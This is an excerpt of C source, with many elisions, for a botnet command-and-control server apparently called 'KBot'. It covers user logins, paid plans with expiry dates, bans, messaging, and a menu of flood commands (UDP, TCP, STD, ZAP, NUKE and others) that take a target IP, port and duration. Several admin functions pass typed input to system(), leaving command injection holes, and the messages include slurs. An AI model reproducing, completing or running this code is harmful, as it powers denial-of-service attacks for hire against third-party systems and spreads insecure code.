...
void timeconnected(void *sock)
{
	...
	while(seconds-- >= closesecs)
		{
			if(seconds == 1800)
			{
				sprintf(sadtimes, "\r\n\e[38;5;201mYou Have 30 Minutes Before You Will Be Logged Out!\r\n");
				send(datafd, sadtimes, strlen(sadtimes), MSG_NOSIGNAL);
				sprintf(sadtimes, "\e[38;5;201m\x1b[01;35mC:/\x1b[38;5;201m%s\x1b[01;35m/\x1b[38;5;201mUsers\x1b[01;35m/\x1b[38;5;201mBotnet\x1b[01;35m>\e[38;5;201m", managements[datafd].id);
				send(datafd, sadtimes, strlen(sadtimes), MSG_NOSIGNAL);					
			}

			else if(seconds == 300)
			{
				sprintf(sadtimes, "\r\n\e[38;5;201mYou Have 5 Minutes Before You Will Be Logged Out!\r\n");
				send(datafd, sadtimes, strlen(sadtimes), MSG_NOSIGNAL);
				sprintf(sadtimes, "\e[38;5;201m\x1b[01;35mC:/\x1b[38;5;201m%s\x1b[01;35m/\x1b[38;5;201mUsers\x1b[01;35m/\x1b[38;5;201mBotnet\x1b[01;35m>\e[38;5;201m", managements[datafd].id);
				send(datafd, sadtimes, strlen(sadtimes), MSG_NOSIGNAL);				
			}
			...
			{
				sprintf(sadtimes, "\r\n\e[38;5;201mYou Have 60 Seconds Before You Will Be Logged Out!\r\n");
				send(datafd, sadtimes, strlen(sadtimes), MSG_NOSIGNAL);
				sprintf(sadtimes, "\e[38;5;201m\x1b[01;35mC:/\x1b[38;5;201m%s\x1b[01;35m/\x1b[38;5;201mUsers\x1b[01;35m/\x1b[38;5;201mBotnet\x1b[01;35m>\e[38;5;201m", managements[datafd].id);
				send(datafd, sadtimes, strlen(sadtimes), MSG_NOSIGNAL);
			}
	...
	char lz[800];
	sprintf(lz, "\r\n\e[38;5;201mYou Have Been Logged Out. You Have Had The Net Open For An Hour\r\n");
...
int checklog()
{
	...
	FILE *logs5;
	if((logs5 = fopen("logs/CAPTCHA.txt", "r")) != NULL)
	{
		fclose(logs5);
	} else {
		char maketos[800];
		strcpy(maketos, "cd logs; touch CAPTCHA.txt");
		system(maketos);
	}
    ...
    while(1) {
		...
		if(gay[datafd].login == 2)
		{
        	...
        	{	
        		if(attacksrunning > 0)
        		{
        			sprintf(string, "%c]0; Servers: %d | %s | %s | Attacks Running: %d | Cooldown: %d %c", '\033', botsconnect(), managements[datafd].id, managements[datafd].planname, attacksrunning, managements[datafd].mycooldown - managements[datafd].cooldownsecs, '\007');
        		} else 
        		{
        			sprintf(string, "%c]0; Servers: %d | %s | %s | Cooldown: %d %c", '\033', botsconnect(), managements[datafd].id, managements[datafd].planname, managements[datafd].mycooldown - managements[datafd].cooldownsecs, '\007');
        		}
        	} 
        	else if(managements[datafd].cooldownstatus == 0)
        	{
        		if(attacksrunning > 0) 
        		{
        			sprintf(string, "%c]0; Servers: %d | %s | %s | Attacks Running: %d %c", '\033', botsconnect(), managements[datafd].id, managements[datafd].planname, attacksrunning, '\007');
        		} else {
        			sprintf(string, "%c]0; Servers: %d | %s | %s %c", '\033', botsconnect(), managements[datafd].id, managements[datafd].planname, '\007');
        		}
        	}
        }
...
void *BotWorker(void *sock)
{
    ...
    while(j!=i-1) {
        ...
        FILE *f1 = fopen("logs/IPBANNED.txt", "r");
            while (getline(&line1, &n1, f1) != -1){
                if (strstr(line1, ipinfo) != NULL){
                    sprintf(botnet, "\e[38;5;201mYOU HAVE BEEN IP BANNED GO VISIT THE KbotS!\r\n");
        ...
        {
		char username [5000];
        sprintf(username, "\e[38;5;201mUsername\e[93m:\e[01;35m", accounts[find_line].username);
		...
		char password [5000];
        sprintf(password, "\e[38;5;201mPassword\e[93m:\e[01;35m", accounts[find_line].password);
        ...
        FILE *f2 = fopen("logs/BANNEDUSERS.txt", "r");
            while (getline(&line2, &n2, f2) != -1){
                if (strstr(line2, nickstring) != NULL){
                    ...
                    sprintf(usethis, "\e[38;5;201mYour Acount Has Been Banned!\r\n");
        ...
        { 
        	...
        	for(toast=0;toast < MAXFDS;toast++){
            	...
            	{
            		char bad[800];
            		sprintf(bad, "\e[38;5;201mUser %s Has Already Logged into C2\r\n", nickstring);
            		if(send(datafd, bad, strlen(bad), MSG_NOSIGNAL) == -1) goto end;

            		sprintf(usethis, "\r\n\e[38;5;201mMessage From C2:\r\nSomeone Tried To Login To Your Account Contact An Admin\r\n");
            		if(send(toast, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;

            		sprintf(usethis, "\e[38;5;201m\x1b[01;35mC:/\x1b[38;5;201m%s\x1b[01;35m/\x1b[38;5;201mUsers\x1b[01;35m/\x1b[38;5;201mBotnet\x1b[01;35m>\e[38;5;201m", nickstring);
            		if(send(toast, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
        	...
        	sprintf(tos1,  "\r\n \e[38;5;201mMirror Mirror on the wall, who has the biggest forehead amongst them all?\r\n");
			
			if(send(datafd, tos1, strlen(tos1), MSG_NOSIGNAL) == -1) goto end;

			sprintf(usethis, "\r\n \e[38;5;201mWho is it?");
			...
			{
				sprintf(usethis, "\e[38;5;201mYou Didnt Answer my riddle!\r\n");
				if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
				sleep(5);
				goto end;
			}
			...
			sprintf(usethis, "\e[38;5;201mYou Have Failed Your Login Please Try Again...\r\n");
			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			sleep(3);
        	goto end;
        ...
        if(check_expiry(datafd) == 1)
        {
            sprintf(clearscreen, "\033[2J\033[1;1H");    
            if(send(datafd, clearscreen,  strlen(clearscreen),    MSG_NOSIGNAL) == -1) goto end;
            send(datafd, "\e[38;5;201mAccount Has Expired, Message Admin For Renewal!\r\n", strlen("\e[38;5;201mAccount Has Expired, Message Admin For Renewal!\r\n"), MSG_NOSIGNAL);
		...
		pthread_create(&title, NULL, &TitleWriter, sock);
				...
				for(loginshit=0;loginshit<MAXFDS;loginshit++)
				{
					if(gay[datafd].just_logged_in == 0 && managements[loginshit].LoginListen == 1 && managements[loginshit].connected == 1 && loggedin == 0)
					{
						...
						sprintf(usethis, "\e[38;5;201m\x1b[01;35mC:/\x1b[38;5;201mbotnet\x1b[01;35m/\x1b[38;5;201mUsers\x1b[01;35m/\x1b[38;5;201m%s\x1b[01;35m>\e[38;5;201m ", managements[loginshit].id);
						if(send(loginshit, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
				...
				sprintf(banner0,  "\e[1;97mMOTD:\e[38;5;201m %s\r\n", motd); 
				sprintf(banner1,  "\e[01;35m    ▄█   ▄█▄ ▀█████████▄   ▄██████▄      ███      \r\n");                                        
                sprintf(banner2,  "\e[01;35m   ███ ▄███▀   ███    ███ ███    ███ ▀█████████▄  \r\n");  
                sprintf(banner3,  "\e[01;35m   ███▐██▀     ███    ███ ███    ███    ▀███▀▀██  \r\n");  
                sprintf(banner4,  "\e[01;35m  ▄█████▀     ▄███▄▄▄██▀  ███    ███     ███   ▀  \r\n");
                sprintf(banner5,  "\e[01;35m ▀▀█████▄    ▀▀███▀▀▀██▄  ███    ███     ███      \r\n");
                sprintf(banner6,  "\e[01;35m   ███▐██▄     ███    ██▄ ███    ███     ███      \r\n");
                sprintf(banner7,  "\e[01;35m   ███ ▀███▄   ███    ███ ███    ███     ███      \r\n");
                sprintf(banner8,  "\e[01;35m   ███   ▀█▀ ▄█████████▀   ▀██████▀     ▄████▀    \r\n");
                sprintf(banner9,  "\e[01;35m   ▀                                              \r\n");
                sprintf(banner10,  "\e[01;35m   True Power ! リアルパワー \r\n");  
		...
		while(1) {
		char input [5000];
        sprintf(input, "\e[38;5;201m\x1b[01;35mC:/\x1b[38;5;201m%s\x1b[01;35m/\x1b[38;5;201mUsers\x1b[01;35m/\x1b[38;5;201mBotnet\x1b[01;35m>\e[38;5;201m", managements[datafd].id);
		...
		while(fdgets(buf, sizeof buf, datafd) > 0) {   
      		...
      		if(strcasestr(buf, "help") || strcasestr(buf, "HELP")) 
      		{
        		...
        		sprintf(help1, "\e[01;35m╔═══════════════════════════════════════╗\e[38;5;201m\r\n");
        		sprintf(help2, "\e[01;35m║\e[38;5;201m \e[01;35mMETHODS\e[38;5;201m - Shows Attack Commands.      \e[01;35m║\e[38;5;201m\r\n");
        		sprintf(help3, "\e[01;35m║\e[38;5;201m \e[01;35mMSG\e[38;5;201m - Message User on C2.             \e[01;35m║\e[38;5;201m\r\n");
        		sprintf(help4, "\e[01;35m║\e[38;5;201m \e[01;35mADMIN\e[38;5;201m - Shows Admin Commands.         \e[01;35m║\e[38;5;201m\r\n");
        		sprintf(help5, "\e[01;35m║\e[38;5;201m \e[01;35mACCOUNT\e[38;5;201m - Shows Account Information.  \e[01;35m║\e[38;5;201m\r\n");
        		sprintf(help6, "\e[01;35m║\e[38;5;201m \e[01;35mONLINE\e[38;5;201m - Shows Online User.           \e[01;35m║\e[38;5;201m\r\n");
        		sprintf(help7, "\e[01;35m║\e[38;5;201m \e[01;35mCLEAR\e[38;5;201m - Clears Screen.                \e[01;35m║\e[38;5;201m\r\n");
        		sprintf(help8, "\e[01;35m╚═══════════════════════════════════════╝\e[38;5;201m\r\n");
				...
				if(send(datafd, help8,  strlen(help8), MSG_NOSIGNAL) == -1) goto end;
					pthread_create(&title, NULL, &TitleWriter, sock);
					char input [5000];
        			sprintf(input, "\e[38;5;201m\x1b[01;35mC:/\x1b[38;5;201m%s\x1b[01;35m/\x1b[38;5;201mUsers\x1b[01;35m/\x1b[38;5;201mBotnet\x1b[01;35m>\e[38;5;201m", accounts[find_line].username);
 			...
 			if(strcasestr(buf, "methods"))
 			{
				...
				sprintf(attack0,   "\e[01;35m╔══════════════════════════════════════════════════╗\e[38;5;201m\r\n");
				sprintf(attack1,   "\e[01;35m║\e[1;97m!* STD IP PORT TIME              \e[01;35m-->\e[01;35mOP-STD        \e[01;35m║\e[38;5;201m\r\n");
				sprintf(attack2,   "\e[01;35m║\e[1;97m!* ZAP IP PORT TIME              \e[01;35m-->\e[01;35mUDP-FRAG-KPAC \e[01;35m║\e[38;5;201m\r\n");   
				sprintf(attack3,   "\e[01;35m║\e[1;97m!* TCP IP PORT TIME FLAG 32 0 10 \e[01;35m-->\e[01;35mNORMAL-TCP    \e[01;35m║\e[38;5;201m\r\n");   
				sprintf(attack4,   "\e[01;35m║\e[1;97m!* STOMP IP PORT TIME 32 all 0 10\e[01;35m-->\e[01;35mRAW-TCP       \e[01;35m║\e[38;5;201m\r\n");     
        	    sprintf(attack5,   "\e[01;35m║\e[1;97m!* SLAP IP PORT TIME 32 1250 10  \e[01;35m-->\e[01;35mTCP-SLAP      \e[01;35m║\e[38;5;201m\r\n");
        	    sprintf(attack6,   "\e[01;35m║\e[1;97m!* UDP IP PORT TIME 32 1024 10   \e[01;35m-->\e[01;35mNORMAL-UDP    \e[01;35m║\e[38;5;201m\r\n");
        	    sprintf(attack7,   "\e[01;35m║\e[1;97m!* RAW IP PORT TIME              \e[01;35m-->\e[01;35mRAW-UDP       \e[01;35m║\e[38;5;201m\r\n");
        	    sprintf(attack8,   "\e[01;35m║\e[1;97m!* NUKE IP PORT TIME             \e[01;35m-->\e[01;35mHEX-TCP-MIX   \e[01;35m║\e[38;5;201m\r\n");
        	    sprintf(attack8,   "\e[01;35m║\e[1;97m!* VOLT IP PORT TIME PSIZE       \e[01;35m-->\e[01;35mRAW-POWER     \e[01;35m║\e[38;5;201m\r\n");
        	    sprintf(attack9,   "\e[01;35m╚══════════════════════════════════════════════════╝\e[38;5;201m\r\n");
        	    sprintf(attack10, "\e[38;5;201m╔══════════════════════════════════════════════════╗  \r\n");
        	    sprintf(attack11, "\e[38;5;201m║ \e[38;5;201mSuggested Method (ZAP)   \e[38;5;201m║  \r\n");
        	    sprintf(attack12, "\e[38;5;201m╚══════════════════════════════════════════════════╝  \r\n");
        	    sprintf(disabled1, "\e[38;5;201m╔══════════════════════════════════════════════════╗  \r\n");
        	    sprintf(disabled2, "\e[38;5;201m║ \e[38;5;201mAttacks Are Currently Disabled Please Try Later. \e[38;5;201m║  \r\n");
        	    sprintf(disabled3, "\e[38;5;201m╚══════════════════════════════════════════════════╝  \r\n");
 		    ...
 		    if(strcasestr(buf, "admin"))
 		    {
        		...
        		sprintf(admin1, "\e[01;35m╔═══════════════════════════════════════╗\e[38;5;201m\r\n");
        		sprintf(admin2, "\e[01;35m║\e[38;5;201m \e[01;35mUser\e[38;5;201m - Shows user cmds.               \e[01;35m║\e[38;5;201m\r\n");
        		sprintf(admin3, "\e[01;35m║\e[38;5;201m \e[01;35mBroadcast\e[38;5;201m - Boradcast a message.      \e[01;35m║\e[38;5;201m\r\n");
        		sprintf(admin4, "\e[01;35m║\e[38;5;201m \e[01;35mTogglelisten\e[38;5;201m - Listen to cmds.        \e[01;35m║\e[38;5;201m\r\n");
        		sprintf(admin5, "\e[01;35m║\e[38;5;201m \e[01;35mToggleAttacks\e[38;5;201m - Control Attacks.      \e[01;35m║\e[38;5;201m\r\n");
        		sprintf(admin6, "\e[01;35m║\e[38;5;201m \e[01;35mTogglelogin\e[38;5;201m - Shows Online User.      \e[01;35m║\e[38;5;201m\r\n");
        		sprintf(admin7, "\e[01;35m║\e[38;5;201m \e[01;35mYOUR A ADMIN!\e[38;5;201m - Dont abuse your power.\e[01;35m║\e[38;5;201m\r\n");
        		sprintf(admin8, "\e[01;35m╚═══════════════════════════════════════╝\e[38;5;201m\r\n");
			...
			{	
				...
				{
					sprintf(usethis, "\e[38;5;201mThis Word Is Not Allowed Here!\r\n");
					if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					sleep(2);
				} else {
				...
				for(tosend=0;tosend < MAXFDS;tosend++){
					if(strstr(managements[tosend].id, usertomsg))
					{
						...
						{
							char sendmsg[800];
							sprintf(sendmsg, "\r\n\e[38;5;201mMSG From %s: %s\r\n", managements[datafd].id, msg);
							if(send(tosend, sendmsg, strlen(sendmsg), MSG_NOSIGNAL) == -1) goto end;
							sprintf(sendmsg, "\e[38;5;201m\x1b[01;35mC:/\x1b[38;5;201m%s\x1b[01;35m/\x1b[38;5;201mUsers\x1b[01;35m/\x1b[38;5;201mBotnet\x1b[01;35m>\e[38;5;201m", managements[tosend].id);
							if(send(tosend, sendmsg, strlen(sendmsg), MSG_NOSIGNAL) == -1) goto end;
							sent = 1;
						} else {
							sent = 3;
					...
					if(sent == 1)
					{
						...
						sprintf(sentmsg, "\e[38;5;201mMsg Sent to: %s\r\n", usertomsg);
						if(send(datafd, sentmsg, strlen(sentmsg), MSG_NOSIGNAL) == -1) goto end;
						sent = 0;
					}
					else if(sent == 3)
					{
						sprintf(usethis, "\e[38;5;201mUser %s Has Messages Toggled OFF\r\n", usertomsg);
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					}
		
					else if(!sent)  
					{
						sprintf(usethis, "\e[38;5;201mUser %s Isnt Online\r\n", usertomsg);
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			...
			if(strcasestr(buf, "online"))
			{
				...
				{
					int online;
					sprintf(usethis, "\e[38;5;201mUsers Online\r\n");
					if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					for(online=0;online < MAXFDS; online++)
					{
						if(strlen(managements[online].id) > 1 && managements[online].connected == 1) 
						{
							...
							{
								sprintf(botnet, "\e[38;5;201m%s | IP: HIDDEN\r\n", managements[online].id);
				...
				sprintf(botnet, "\e[38;5;201mTotal Users Online: %d\r\n", OperatorsConnected);
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
			}
			...
			if(strcasestr(buf, "user")) {
				if(managements[datafd].adminstatus == 1)
				{
					...
					sprintf(whatyucanuse1,  "    \e[38;5;201m  ╔═════════════\e[38;5;201m╗   \e[38;5;201m╔═════════════\e[38;5;201m╗\r\n");
					sprintf(whatyucanuse2,  "    \e[38;5;201m  ║  \e[01;35mAdd User.  \e[38;5;201m║ \e[38;5;201m  ║  \e[01;35mKick User. \e[38;5;201m║\r\n");
					sprintf(whatyucanuse3,  "    \e[38;5;201m  ╚\e[38;5;201m═════════════╝   \e[38;5;201m╚\e[38;5;201m═════════════╝\r\n");
					sprintf(whatyucanuse4,  "    \e[38;5;201m  ╔═════════════\e[38;5;201m╗   \e[38;5;201m╔═════════════\e[38;5;201m╗\r\n");
					sprintf(whatyucanuse5,  "    \e[38;5;201m  ║  \e[01;35mRem User.  \e[38;5;201m║ \e[38;5;201m  ║  \e[01;35mBlacklist. \e[38;5;201m║\r\n");
					sprintf(whatyucanuse6,  "    \e[38;5;201m  ╚\e[38;5;201m═════════════╝   \e[38;5;201m╚\e[38;5;201m═════════════╝\r\n");
					sprintf(whatyucanuse7,  "    \e[38;5;201m  ╔═════════════\e[38;5;201m╗   \r\n");
					sprintf(whatyucanuse8,  "    \e[38;5;201m  ║  \e[01;35mBan User.  \e[38;5;201m║   \r\n");
					sprintf(whatyucanuse9,  "    \e[38;5;201m  ╚\e[38;5;201m═════════════╝   \r\n");
					sprintf(whatyucanuse10, "    \e[38;5;201m  ╔═════════════\e[38;5;201m╗   \r\n");
					sprintf(whatyucanuse11, "    \e[38;5;201m  ║ \e[01;35mUnBan User. \e[38;5;201m║   \r\n");
					sprintf(whatyucanuse12, "    \e[38;5;201m  ╚\e[38;5;201m═════════════╝   \r\n");
					sprintf(whatyucanuse13, "    \e[38;5;201m  ╔═════════════\e[38;5;201m╗   \r\n");
					sprintf(whatyucanuse14, "    \e[38;5;201m  ║ \e[01;35mIPBan User. \e[38;5;201m║   \r\n");
					sprintf(whatyucanuse15, "    \e[38;5;201m  ╚\e[38;5;201m═════════════╝   \r\n");
					sprintf(whatyucanuse16, "    \e[38;5;201m  ╔═══════════════\e[38;5;201m╗ \r\n");
					sprintf(whatyucanuse17, "    \e[38;5;201m  ║ \e[01;35mUnIPBan User. \e[38;5;201m║ \r\n");
					sprintf(whatyucanuse18, "    \e[38;5;201m  ╚\e[38;5;201m═══════════════╝ \r\n");
					...
					sprintf(options, "\e[38;5;201mOption:");
					...
					if(strstr(buf, "1") || strstr(buf, "ONE") || strstr(buf, "One") || strstr(buf, "one"))
					{
						...
						char newexpiry[800];
						char send1[1024];
						sprintf(usethis, "\e[38;5;201mUsename:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						...
						sprintf(usethis, "\e[38;5;201mpassword:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						...
						sprintf(usethis, "\e[38;5;201madmin(y or n):");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						...
						sprintf(usethis, "   \e[38;5;201m╔═══════╗ ╔═══════╗ ╔═══════╗\r\n   ║\e[38;5;201m Basic \e[38;5;201m║ ║ \e[38;5;201m VIP \e[38;5;201m ║ ║\e[38;5;201m  MVP \e[38;5;201m ║\r\n   \e[38;5;201m╚═══════╝ ╚═══════╝ ╚═══════╝\r\n");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			
						sprintf(usethis, "\e[38;5;201mPlan:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0, sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						...
						sprintf(usethis, "\e[38;5;201mUsage: DD/MM/YY\r\nExpiry:");
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(buf, 0,sizeof(buf));
						if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
						trim(buf);
						...
						system(send1);
						sprintf(usethis, "\e[38;5;201mAccount [%s] Added\r\n", username1);
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					...
					else if(strstr(buf, "2") || strstr(buf, "TWO") || strstr(buf, "Two") || strstr(buf, "two"))
					{
						...
						system(sys);
						sprintf(usethis, "\e[38;5;201mAccount [%s] Has Been Removed\r\n", removeuser);
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					...
					else if(strstr(buf, "3") || strstr(buf, "THREE") || strstr(buf, "Three") || strstr(buf, "three"))
					{
						...
						system(send1);
						sprintf(usethis, "\e[38;5;201mAccount [%s] Has Been Banned\r\n", banuser);
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					...
					else if(strstr(buf, "4") || strstr(buf, "FOUR") || strstr(buf, "Four") || strstr(buf, "four"))
					{
						...
						system(sys);
						sprintf(usethis, "\e[38;5;201mAccount [%s] Has Been UnBanned\r\n", unbanuser);
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					...
					else if(strstr(buf, "5") || strstr(buf, "FIVE") || strstr(buf, "Five") || strstr(buf, "five"))
					{
						...
						system(send1);
						sprintf(usethis, "\e[38;5;201m[%s] Has Been IP Banned\r\n", buf);
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					...
					else if(strstr(buf, "6") || strstr(buf, "SIX") || strstr(buf, "Six") || strstr(buf, "six"))
					{
						...
						system(sys);
						sprintf(usethis, "\e[38;5;201m[%s] Has Been UnIPBanned\r\n", buf);
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					...
					{	
						...
						for(kickonline=0;kickonline<MAXFDS;kickonline++)
						{
							...
							{
								sprintf(usethis, "\r\n\e[38;5;201mYou Have Been Kicked GTFO SHITTER!\r\n");
						...
						if(sent != NULL)
						{
							sprintf(usethis,"\e[38;5;201mUser %s Has Been Kicked\r\n", usertokick);
							if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						...
						{
							sprintf(usethis, "\e[38;5;201mUser %s Isnt Online... Did You Not Read the Online List Retard!?\r\n", usertokick);
							if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						}
					}
					...
					else if(strstr(buf, "8"))
					{
						...
						system(send1);
						sprintf(usethis, "\e[38;5;201m[%s] Has Been Blacklisted\r\n", Blacklistip);
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					...
					else if(strstr(buf, "cls"));
					{
			 		...
			 		char noperms[800];
			 		sprintf(noperms, "\e[38;5;201mYou Do Not Have Admin Perms Bitch!   - add user\r\n");
        	...
        	if(strcasestr(buf, "motd"))
 			{
				if(managements[datafd].adminstatus == 1)
        	    {
        	   		char sendbuf[50]; 
 					memset(buf, 0, sizeof(buf));
 					sprintf(sendbuf, "\e[38;5;201mMOTD: "); 
 					...
 					if(strlen(buf) < 80)
 					{
 							motdaction = 1;
 							strcpy(motd, buf);
 							sprintf(usethis, "\e[38;5;201mMOTD Has Been Updated\r\n");
 							if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
				...
				{
					char sendbuf[50]; 
					sprintf(sendbuf, "\e[38;5;201mYou Do Not Have Admin Perms Bitch! - MOTD\r\n");
					send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
				}
 				...
 				if(managements[datafd].adminstatus == 1)
 				{
 					...
 					memset(buf,0,sizeof(buf));
 							...
 							if(OperatorsConnected > 1)
 							{
 								for(brdcstthing=0;brdcstthing<MAXFDS;brdcstthing++)
 								{
 									if(managements[brdcstthing].connected == 1 && strcmp(managements[brdcstthing].id, managements[datafd].id) != 0)
 									{
 										...
 										{
 											sprintf(usethis, "\r\n\e[38;5;201mBroadcasted Message From %s\r\nMSG: %s\r\n", managements[datafd].id, broadcastmsg);
 											if(send(brdcstthing, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
		
 											sprintf(usethis, "\e[38;5;201m\x1b[01;35mC:/\x1b[38;5;201m%s\x1b[01;35m/\x1b[38;5;201mUsers\x1b[01;35m/\x1b[38;5;201mBotnet\x1b[01;35m>\e[38;5;201m", managements[brdcstthing].id);
 											if(send(brdcstthing, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 											sent = 1;
 											userssentto++;
 										} else {
 								...
 								sprintf(usethis, "\e[38;5;201mThere Are Currently No Users Online\r\n");
 								if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 							}
 						} else {
 							sprintf(usethis, "\e[38;5;201mBroadcasted Message Cannot Be Over 80 Characters\r\n");
 							if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 						}
 						...
 						if(sent == 1)
 						{
 							...
 							sprintf(usethis, "\e[38;5;201mMessage Broadcasted To %d Users | %d Users Have Broadcast Toggled Off\r\n", userssentto, msgoff);
 							if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 							sent = 0;
					...
					char sendbuf[50]; 
					sprintf(sendbuf, "\e[38;5;201mYou Do Not Have Admin Perms Bitch! - BROADCAST\r\n");
					send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL); 		 				
 				}
 			}
 			...
 			if(strcasestr(buf, "ToggleListen"))
 			{
 				if(managements[datafd].adminstatus == 1)
 				{
 					if(managements[datafd].listenattacks == 0)
 					{
 						...
 						sprintf(usethis, "\e[38;5;201mAttack Listen Has Been turned ON\r\n");
 						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 					...
 					else if(managements[datafd].listenattacks == 1)
 					{
 						...
 						sprintf(usethis, "\e[38;5;201mAttack Listen Has Been turned OFF\r\n");
 						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 						printf("[Botnet]:%s Is No Longer Listening To Attacks\n", managements[datafd].id);
 					}
 				} else {
					char sendbuf[50]; 
					sprintf(sendbuf, "\e[38;5;201mYou Do Not Have Admin Perms Bitch! - TOGGLELISTEN\r\n");
					send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL); 				
 				}
 			}
 			...
 			else if(strcasestr(buf, "ToggleAttacks"))
 			{
 				if(managements[datafd].adminstatus == 1)
 				{
 					if(AttackStatus == 0)
 					{
        	        			sprintf(usethis, "\e[38;5;201mAttacks Have Been Toggled OFF\r\n");
        	        			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
        	        			printf("[Botnet]:%s Has Toggled OFF Attacks\n", managements[datafd].id);
        	        			AttackStatus = 1;
 					} else {
        	        			sprintf(usethis, "\e[38;5;201mAttacks Have Been Toggled ON\r\n");
        	        			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					...
					char sendbuf[50]; 
					sprintf(sendbuf, "\e[38;5;201mYou Do Not Have Admin Perms Bitch! - TOGGLEATTACKS\r\n");
					send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL); 	 				
 				}
 			}
 			...
 			else if(strcasestr(buf, "ToggleLogin"))
 			{
 				if(managements[datafd].adminstatus == 1)
 				{
 					...
 					{
 						sprintf(usethis, "\e[38;5;201mYou Have Stopped Listening To Logins/Logouts\r\n");
 						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 						printf("[Botnet]:%s Is Listening To Logins\n", managements[datafd].id);
 						managements[datafd].LoginListen = 0;
 					} else {
 						sprintf(usethis, "\e[38;5;201mYou Have Started Listening To Logins/Logouts\r\n");
 						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					...
					char sendbuf[50]; 
					sprintf(sendbuf, "\e[38;5;201mYou Do Not Have Admin Perms! - TOGGELLOGIN\r\n");
					send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL); 	
 				}
 			}
			...
			if(strcasestr(buf, "toggle1"))
			{
				...
				{
					sprintf(usethis, "\e[38;5;201mRecieving Messages Has Been Toggled OFF\r\n");
					if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					printf("[Botnet]:%s Has Turned OFF The Receiving of Private Messages\n", managements[datafd].id);
					managements[datafd].msgtoggle = 1;
				} else {
					sprintf(usethis, "\e[38;5;201mRecieving Messages Has Been Toggled ON\r\n");
					if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			...
			if(strcasestr(buf, "toggle2"))
			{
				...
				{
					sprintf(usethis, "\e[38;5;201mRecieving Brodcasts Has Been Toggled OFF\r\n");
					if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					printf("[Botnet]:%s Has Turned OFF The Receiving of Broadcasted Messages\n", managements[datafd].id);
					managements[datafd].broadcasttoggle = 1;
				} else {
					sprintf(usethis, "\e[38;5;201mRecieving Brodcasts Has Been Toggled ON\r\n");
					if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
            		...
            		if(managements[datafd].cooldownstatus == 0)
            		{
            			if(Sending[datafd].amountofatks <= 4)
            			{
                			...
                			{ 
                			    ...
                			    sprintf(invalidargz1, "\e[38;5;201mInvalid Synxtax!\r\n");
                			...
                			{ 
                			    char invalidargz1[800];
                			    sprintf(invalidargz1, "\e[38;5;201mBoot Time Exceeded\r\n");
                			    if(send(datafd, invalidargz1, strlen(invalidargz1), MSG_NOSIGNAL) == -1) goto end;
                			} else {
								...
								FILE *f3 = fopen("logs/Blacklist.txt", "r");
								    while (getline(&line3, &n3, f3) != -1){
